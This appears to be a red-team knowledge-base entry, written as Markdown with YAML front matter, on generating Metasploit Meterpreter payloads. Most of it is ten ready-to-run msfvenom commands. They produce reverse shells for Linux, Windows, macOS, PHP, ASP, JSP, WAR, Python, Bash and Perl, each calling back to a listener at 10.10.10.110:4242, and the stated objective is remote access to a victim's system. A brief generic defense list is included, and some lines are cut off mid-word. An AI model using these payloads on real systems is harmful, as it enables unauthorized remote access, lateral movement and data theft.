---
id: 7dabd646-1784-4a6b-ade3-a3b4130a514d
name: Meterpreter Payload Generation
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:21.292947+00:00'
updated_at: '2023-04-10T20:25:02.562278+00:00'
tactics:
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Remote Services|T1021 - Remote Services]]'
tags:
- '[[Generate a meterpreter]]'
- '[[Metasploit]]'
- '[[Meterpreter - Basic]]'
commands:
- '[[Generate Bash Reverse Shell]]'
- '[[Generate Java JSP Shell Reverse TCP]]'
- '[[Generate Java WAR Shell Reverse TCP]]'
- '[[Generate Linux Meterpreter Reverse Shell]]'
- '[[Generate OSX Reverse Shell]]'
- '[[Generate Perl Reverse Shell]]'
- '[[Generate PHP Meterpreter Reverse Shell]]'
- '[[Generate Python Reverse Shell]]'
- '[[Generate Windows ASP Reverse Shell]]'
- '[[Generate Windows Meterpreter Reverse Shell]]'
---

# Meterpreter Payload Generation

## Summary

Meterpreter is a powerful payload used in penetration testing for remote code execution. Generating a Meterpreter payload with Metasploit allows an attacker to gain remote access to a victim's system. Meterpreter can be used to execute commands, upload and download files, and even pivot to other sy

## Description

# Description

Meterpreter is a powerful payload used in penetration testing for remote code execution. Generating a Meterpreter payload with Metasploit allows an attacker to gain remote access to a victim's system. Meterpreter can be used to execute commands, upload and download files, and even pivot to other systems within the victim's network. This procedure generates a Meterpreter payload using Metasploit's multi-platform payload generator.

 

## Requirements

1. Access to Metasploit framework.

1. Knowledge of target system architecture and operating system.

 

## Defense

1. Ensure that all systems and software are up-to-date with the latest patches and security updates.

1. Use network segmentation to limit the impact of a potential attack.

1. Implement strong authentication measures such as multi-factor authentication to prevent unauthorized access to sensitive systems.

 

## Objectives

1. Generate a Meterpreter payload for remote code execution on a target system.

1. Gain remote access to a victim's system using the generated payload.

 

# Instructions

1. Use the msfvenom tool to generate payloads for different platforms.

 



**Code**: [[$ msfvenom -p linux/x86/meterpreter/reverse_tcp LH]]



> The commands generate payloads for different platforms such as Linux, Windows, OSX, PHP, Java, and others. The payloads are generated using the msfvenom tool and different options are used to specify the type of payload and the format in which it should be generated. The LHOST and LPORT options are used to specify the IP address and port number of the listener to which the payload will connect. The generated payloads can be used for various purposes such as penetration testing, vulnerability assessment, and network security testing.



**Command** ([[Generate Linux Meterpreter Reverse Shell]]):

```bash
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f elf > shell.elf
```





**Command** ([[Generate Windows Meterpreter Reverse Shell]]):

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f exe > shell.exe
```





**Command** ([[Generate OSX Reverse Shell]]):

```bash
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f macho > shell.macho
```





**Command** ([[Generate PHP Meterpreter Reverse Shell]]):

```bash
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
```





**Command** ([[Generate Windows ASP Reverse Shell]]):

```bash
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f asp > shell.asp
```





**Command** ([[Generate Java JSP Shell Reverse TCP]]):

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f raw > shell.jsp
```





**Command** ([[Generate Java WAR Shell Reverse TCP]]):

```bash
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4242 -f war > shell.war
```





**Command** ([[Generate Python Reverse Shell]]):

```bash
$ msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4242 -f raw > shell.py
```





**Command** ([[Generate Bash Reverse Shell]]):

```bash
$ msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4242 -f raw > shell.sh
```





**Command** ([[Generate Perl Reverse Shell]]):

```bash
$ msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4242 -f raw > shell.pl
```



## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Remote Services|T1021 - Remote Services]]

## Commands Used

- [[Generate Bash Reverse Shell]]
- [[Generate Java JSP Shell Reverse TCP]]
- [[Generate Java WAR Shell Reverse TCP]]
- [[Generate Linux Meterpreter Reverse Shell]]
- [[Generate OSX Reverse Shell]]
- [[Generate Perl Reverse Shell]]
- [[Generate PHP Meterpreter Reverse Shell]]
- [[Generate Python Reverse Shell]]
- [[Generate Windows ASP Reverse Shell]]
- [[Generate Windows Meterpreter Reverse Shell]]

## Tags

- [[Generate a meterpreter]]
- [[Metasploit]]
- [[Meterpreter - Basic]]


